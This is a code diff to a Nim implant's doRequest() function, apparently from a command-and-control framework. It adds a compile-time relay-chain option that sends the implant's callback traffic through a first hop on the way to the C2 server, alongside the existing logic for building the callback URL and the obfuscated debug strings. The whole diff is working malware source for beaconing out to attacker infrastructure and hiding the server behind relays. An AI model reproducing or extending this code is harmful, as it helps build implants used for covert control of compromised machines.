@@ -70,31 +70,47 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                 echo obf("DEBUG: doRequest() - listenerPort: ") & li.listenerPort
                 echo obf("DEBUG: doRequest() - path: ") & path
             
-            # Determine target URL based on implantCallbackIp
+            # Determine target URL based on implantCallbackIp or RELAY_CHAIN
             var target : string
             
-            # Check if implantCallbackIp already includes protocol (http:// or https://)
-            if li.implantCallbackIp.startsWith("http://") or li.implantCallbackIp.startsWith("https://"):
-                # Full URL provided, use as-is
-                target = li.implantCallbackIp
+            # If RELAY_CHAIN is defined, extract first hop as target
+            const RELAY_CHAIN_TARGET {.strdefine.}: string = ""
+            when RELAY_CHAIN_TARGET != "":
+                # Extract first hop from RELAY_CHAIN (format: "relay1:8080,relay2:8080,c2:5000")
+                let firstHop = if RELAY_CHAIN_TARGET.contains(","): 
+                    RELAY_CHAIN_TARGET.split(",")[0] 
+                else: 
+                    RELAY_CHAIN_TARGET
+                
+                # Build target URL with first relay hop
+                target = toLowerAscii(li.listenerType) & "://" & firstHop & path
+                
+                when defined verbose:
+                    echo obf("DEBUG: Using first relay hop as target: ") & firstHop
             else:
-                # Only host provided, build URL with protocol from config
-                target = toLowerAscii(li.listenerType) & "://"
-                
-                # Smart detection: If implantCallbackIp looks like a domain (contains letters),
-                # don't add port (uses protocol default). If it's an IP, add port.
-                var needsPort = true
-                for c in li.implantCallbackIp:
-                    if c in {'a'..'z', 'A'..'Z'}:
-                        needsPort = false
-                        break
-                
-                if needsPort:
-                    target = target & li.implantCallbackIp & ":" & li.listenerPort
+                # Standard mode: use implantCallbackIp from config
+                # Check if implantCallbackIp already includes protocol (http:// or https://)
+                if li.implantCallbackIp.startsWith("http://") or li.implantCallbackIp.startsWith("https://"):
+                    # Full URL provided, use as-is
+                    target = li.implantCallbackIp
                 else:
-                    target = target & li.implantCallbackIp
-            
-            target = target & path
+                    # Only host provided, build URL with protocol from config
+                    target = toLowerAscii(li.listenerType) & "://"
+                    
+                    # Smart detection: If implantCallbackIp looks like a domain (contains letters),
+                    # don't add port (uses protocol default). If it's an IP, add port.
+                    var needsPort = true
+                    for c in li.implantCallbackIp:
+                        if c in {'a'..'z', 'A'..'Z'}:
+                            needsPort = false
+                            break
+                    
+                    if needsPort:
+                        target = target & li.implantCallbackIp & ":" & li.listenerPort
+                    else:
+                        target = target & li.implantCallbackIp
+                
+                target = target & path
 
             when defined verbose:
                 echo obf("DEBUG: doRequest() - target URL: ") & target
